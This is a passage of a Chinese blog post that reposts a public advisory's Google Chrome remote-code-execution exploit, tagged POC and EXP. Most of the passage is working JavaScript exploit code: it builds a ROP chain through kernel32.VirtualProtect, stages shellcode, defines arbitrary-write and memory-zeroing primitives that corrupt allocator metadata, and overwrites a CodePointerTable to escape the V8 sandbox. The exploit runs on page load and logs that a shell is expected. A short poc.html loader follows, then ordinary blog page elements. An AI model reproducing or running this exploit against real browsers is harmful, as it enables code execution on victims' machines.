        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> virtualprotect_iat_ofs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rax = &amp;kernel32.VirtualProtect</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> jmp_drax<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// jmp qword ptr [rax]</span>
        <span class="token function">set_rop</span><span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x14000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// shellcode</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>
            <span class="token number">0x1f000</span> <span class="token operator">+</span> i<span class="token punctuation">,</span>
            <span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_gadget<span class="token punctuation">)</span> <span class="token operator">^</span> fptr_xor<span class="token punctuation">,</span>
            <span class="token boolean">true</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">//dv.setBigUint64(0x1f000 + i, 0xdeadbeefcafe0000n + BigInt(i / 0x10), true);</span>
        <span class="token punctuation">&#125;</span>

        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] shellcode / ropchain / vtable init complete"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// helper function to recursively zero out a memory region via primitive #1 (two top zero bytes), with collateral damage to [base-6, base) and [base+0x17, base+len+0x1f)</span>
        <span class="token comment">// ! WARNING ! caller must assert PA_CHECK(bucket->num_full_slot_spans) for all strides (descending from len - 2 by stride 2)</span>
        <span class="token comment">// use only for small len (under 0x16) as it will eventually overwrite itself</span>
        <span class="token keyword">function</span> <span class="token function">zero_out</span><span class="token punctuation">(</span><span class="token parameter">base<span class="token punctuation">,</span> len<span class="token punctuation">,</span> stride <span class="token operator">=</span> <span class="token number">2</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> ofs <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> ofs <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> ofs <span class="token operator">-=</span> stride<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> base <span class="token operator">+</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>ofs<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">6n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 1</span>
            abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// helper function for arbitrary addr &amp; value write</span>
        <span class="token comment">// caller must assert nullity of [target-8], [target], [target+0x10]</span>
        <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// save current freelist_head</span>
          <span class="token keyword">const</span> freelist_head_orig <span class="token operator">=</span> dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x10000n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->freelist_head = non-null</span>

          <span class="token keyword">const</span> new_bitfield <span class="token operator">=</span>
            <span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">14n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2n</span><span class="token punctuation">;</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1088</span><span class="token punctuation">,</span> target <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->next_slot_span = target - 8</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1090</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x20000n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->bucket = bucket</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> new_bitfield<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 0, meta->num_allocated_slots = 1</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x20000</span><span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1080n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->active_slot_spans_head = meta</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x20000</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->decomitted_slot_spans_head = value</span>
          dv<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0x20000</span> <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bucket->num_system_pages_per_slot_span = 1 (avoid PartitionDirectUnmap())</span>

          abs<span class="token punctuation">[</span>absctr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span>
            <span class="token number">0x1098</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1098</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">14n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span>
              <span class="token punctuation">(</span><span class="token number">0x300n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token boolean">true</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->marked_full = 0, meta->num_allocated_slots = 0x300</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x1080</span><span class="token punctuation">,</span> freelist_head_orig<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// meta->freelist_head = original</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// DEBUG: pre-opt zero_out() &amp; arb_write()</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] DEBUG: pre-opt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21018</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1n</span> <span class="token operator">&lt;&lt;</span> <span class="token number">64n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">zero_out</span><span class="token punctuation">(</span>ab_partition_base <span class="token operator">+</span> <span class="token number">0x21000n</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21008</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21018</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">arb_write</span><span class="token punctuation">(</span>ab_partition_base <span class="token operator">+</span> <span class="token number">0x21008n</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeefcafebaben</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          dv<span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0x21008</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> trigger <span class="token operator">=</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] sleeping 1000ms..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// set ropchain addr (ab_partition_base + 0x1e000n)</span>
        <span class="token comment">// all zeros, use sbx primitive #2</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write prepare (ropchain addr)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">arb_write</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_rax<span class="token punctuation">,</span> ab_partition_base <span class="token operator">+</span> <span class="token number">0x1e000n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write success (ropchain addr)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// set vtable pivot gadget</span>
        <span class="token comment">// surrounded with pointers into chrome.dll, use #1 + #2</span>
        <span class="token comment">// ordering is super important!!</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write prepare (pivot gadget)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0, 6)       / [-6, 0), [0x17, 0x25)</span>
        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [-8, 0)      / [...), [0x11, 0x1f)</span>
        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0x10, 0x18) / [8, 0x10), [...)</span>
        <span class="token function">arb_write</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> vtable_call_base<span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> pivot_gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write success (pivot gadget)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// overwrite CodePointerTable</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] target write (CPT)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] expect shell after 500ms!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pulls down from Sandbox base, stride=1 just in case</span>
        <span class="token comment">// pulls down from Sandbox size, stride=1 just in case</span>
        <span class="token comment">// lower 2byte 0, upper 2byte non-zero to prevent some weird resetting logic (zeros actually come from bytes index 2~3 from SlotSpanMetadata instead of the top two 6~7)</span>
        <span class="token function">zero_out</span><span class="token punctuation">(</span>chrome_base <span class="token operator">+</span> base_tgt_ofs <span class="token operator">+</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x4n</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">arb_write</span><span class="token punctuation">(</span>
          chrome_base <span class="token operator">+</span> base_tgt_ofs<span class="token punctuation">,</span>
          ab_partition_base <span class="token operator">+</span> <span class="token number">0x1f000n</span> <span class="token operator">-</span> <span class="token number">0x10000n</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// fake CPT, i.e. "vtable" (vtable starts at 0x1f000, offset 0x103d0 -> translate to 0x1f3d0)</span>
        <span class="token comment">//console.log('[*] target write success (CPT)');</span>

        <span class="token comment">// trigger through CPT call (await isn't strictly needed, it triggers itself on timeout)</span>
        <span class="token keyword">await</span> trigger<span class="token punctuation">;</span>

        <span class="token comment">// DEBUG: crash</span>
        <span class="token comment">//caged_write(0xfffffff0, 0xdeadc0d3);</span>
      <span class="token punctuation">&#125;</span>

      window<span class="token punctuation">.</span>onload <span class="token operator">=</span> exp<span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- poc.html --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wasm-module-builder.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>poc.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
From: <a target="_blank" rel="noopener" href="https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/">https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/</a></li>
</ul>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">你的朋友</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://topk-li.github.io/2024/08/27/google-chrome-rce-cve-2024-2887-de-bian-ti-lou-dong/">https://topk-li.github.io/2024/08/27/google-chrome-rce-cve-2024-2887-de-bian-ti-lou-dong/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">你的朋友</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/POC/">
                                    <span class="chip bg-color">POC</span>
                                </a>
                            
                                <a href="/tags/EXP/">
                                    <span class="chip bg-color">EXP</span>
                                </a>
                            
                                <a href="/tags/Chrome/">
                                    <span class="chip bg-color">Chrome</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/09/03/xiu-fu-chrome-da-bu-kai-di-san-fang-ying-yong-nei-lian-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="修复 chrome 打不开第三方应用内链接">
                        
                        <span class="card-title">修复 chrome 打不开第三方应用内链接</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            默认浏览器为 Chrome 时打不开第三方应用内链接（点击没有反应）
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-03
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/" class="post-category">
                                    运维笔记
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%BF%90%E7%BB%B4/">
                        <span class="chip bg-color">运维</span>
                    </a>
                    
                    <a href="/tags/Chrome/">
                        <span class="chip bg-color">Chrome</span>
                    </a>
                    
                    <a href="/tags/BUG/">
                        <span class="chip bg-color">BUG</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/08/27/vmware-an-zhuang-win10-hou-yi-zhi-lan-ping-chong-qi-zhong-zhi-dai-ma-unsupported-processor/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="VMware安装Win10后一直蓝屏重启，终止代码UNSUPPORTED PROCESSOR">
                        
                        <span class="card-title">VMware安装Win10后一直蓝屏重启，终止代码UNSUPPORTED PROCESSOR</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            VMware客户机操作系统的安装会中止，并出现绿屏（或蓝屏）和错误消息 UNSUPPORTED_PROCESSOR。原因似乎是 Microsoft 对 Hyper-V 进行了修改。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-08-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/" class="post-category">
                                    运维笔记
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%BF%90%E7%BB%B4/">
                        <span class="chip bg-color">运维</span>
                    </a>
                    
                    <a href="/tags/VMware/">
                        <span class="chip bg-color">VMware</span>
                    </a>
                    
                    <a href="/tags/Windows10/">
                        <span class="chip bg-color">Windows10</span>
                    </a>
                    
                    <a href="/tags/BUG/">
                        <span class="chip bg-color">BUG</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2020-2025</span>
            
            <a href="/about" target="_blank">你的朋友</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
                <span id="translate">|&nbsp;繁/简：</span><a id="translateLink" href="javascript:translatePage();">繁</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:topk_an@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
